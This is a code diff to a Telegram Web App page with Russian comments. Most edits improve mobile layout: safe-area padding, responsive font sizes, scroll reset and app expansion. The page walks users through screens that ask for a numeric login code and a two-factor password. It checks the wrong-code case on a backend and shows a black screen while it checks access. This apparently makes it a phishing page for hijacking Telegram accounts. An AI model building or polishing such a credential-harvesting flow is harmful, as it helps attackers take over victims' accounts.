@@ -7,13 +7,17 @@
   <script async src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root { color-scheme: dark; }
+    *, *::before, *::after { box-sizing: border-box; }
     /* По умолчанию — чистый чёрный экран без контента (пока идёт проверка
        доступа / редирект). Тема и фон применяются только после granted. */
     html, body {
-      margin: 0; padding: 0; height: 100%;
+      margin: 0; padding: 0;
+      min-height: 100%;
       background: #000;
       color: #fff;
       font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+      -webkit-text-size-adjust: 100%;
+      overflow-x: hidden;
     }
     #bg {
       position: fixed; inset: 0; z-index: -1;
@@ -21,30 +25,39 @@
     }
     #root {
       position: relative;
-      min-height: 100%;
+      min-height: 100vh;            /* фолбэк для старых вебвью */
+      min-height: 100dvh;           /* реальная высота экрана телефона */
       display: flex; flex-direction: column;
       align-items: center; justify-content: center;
-      text-align: center; padding: 24px; box-sizing: border-box;
+      text-align: center;
+      /* отступы + безопасные зоны (вырез/закругления телефонов) */
+      padding: calc(24px + env(safe-area-inset-top)) 20px
+               calc(24px + env(safe-area-inset-bottom)) 20px;
     }
-    .card { max-width: 420px; }
-    h2 { margin: 0 0 12px; font-size: 22px; }
-    p { margin: 6px 0; opacity: .85; line-height: 1.4; }
-    .muted { font-size: 13px; opacity: .6; }
-    .emoji { font-size: 64px; line-height: 1; margin-bottom: 16px; }
-    .text { font-size: 17px; line-height: 1.45; margin-bottom: 20px; }
+    .card { width: 100%; max-width: 380px; margin: auto 0; }
+    h2 { margin: 0 0 12px; font-size: clamp(20px, 6vw, 24px); }
+    p { margin: 6px 0; opacity: .85; line-height: 1.45; }
+    .muted { font-size: clamp(12px, 3.6vw, 14px); opacity: .6; }
+    .emoji { font-size: clamp(44px, 16vw, 68px); line-height: 1; margin-bottom: 16px; }
+    .text {
+      font-size: clamp(15px, 4.3vw, 18px); line-height: 1.5;
+      margin-bottom: 22px; overflow-wrap: anywhere;
+    }
     .btn {
-      display: inline-block; border: none; cursor: pointer;
-      padding: 14px 28px; border-radius: 12px; font-size: 16px;
+      display: block; width: 100%; max-width: 340px; margin: 4px auto 0;
+      border: none; cursor: pointer; -webkit-appearance: none;
+      padding: 15px 24px; border-radius: 14px; font-size: 16px; font-weight: 600;
       color: #fff; background: var(--tg-theme-button-color, #2ea6ff);
     }
     .inp {
-      display: block; width: 100%; box-sizing: border-box;
-      margin: 0 0 14px; padding: 13px 16px; border-radius: 12px;
+      display: block; width: 100%; max-width: 340px;
+      margin: 0 auto 14px; padding: 14px 16px; border-radius: 14px;
       border: 1px solid rgba(127,127,127,.35);
       background: rgba(127,127,127,.12); color: #fff;
-      font-size: 16px; text-align: center; outline: none;
+      font-size: 16px;            /* >=16px — iOS не зумит при фокусе */
+      text-align: center; outline: none;
     }
-    .step { font-size: 12px; opacity: .45; margin-top: 18px; }
+    .step { font-size: 12px; opacity: .4; margin-top: 18px; }
     .spinner {
       width: 28px; height: 28px; border-radius: 50%;
       border: 3px solid rgba(127,127,127,.3);
@@ -118,25 +131,29 @@
       if (!p) return;
       var out = "";
       if (p.emoji) out += '<div class="emoji">' + p.emoji + "</div>";
-      // text/waiting/wrong/hint хранятся как HTML-разметка шаблона — как есть
+      // text/hint хранятся как HTML-разметка шаблона — выводим как есть
       if (p.text) out += '<div class="text">' + p.text + "</div>";
       // поле ввода для страниц «код» и «2FA»
       if (p.key === "code") {
+        // p.wrong («Вы ввели неверный код») сюда НЕ выводим — он остаётся в
+        // конфиге и показывается бекенд-логикой только при неверном вводе.
         out += '<input class="inp" id="inp" inputmode="numeric" '
              + 'placeholder="• • • • •" />';
-        if (p.wrong) out += '<p class="muted">' + p.wrong + "</p>";
       } else if (p.key === "twofa") {
         out += '<input class="inp" id="inp" type="password" placeholder="'
              + esc(p.placeholder) + '" />';
         if (p.hint) out += '<p class="muted">' + p.hint + "</p>";
-      } else if (p.key === "main" && p.waiting) {
-        out += '<p class="muted">' + p.waiting + "</p>";
       }
       var last = i >= PAGES.length - 1;
       var label = p.button || (last ? "Готово" : "Далее");
       out += '<button class="btn" id="act">' + esc(label) + "</button>";
       out += '<div class="step">' + (i + 1) + " / " + PAGES.length + "</div>";
       html(out);
+      // после смены страницы возвращаем экран в начало — иначе вёрстка
+      // «уезжает» и приходится прокручивать вручную
+      window.scrollTo(0, 0);
+      var tg = tgApp();
+      if (tg) { try { tg.expand(); } catch (e) {} }
       var act = document.getElementById("act");
       if (act) act.onclick = nextStep;
     }
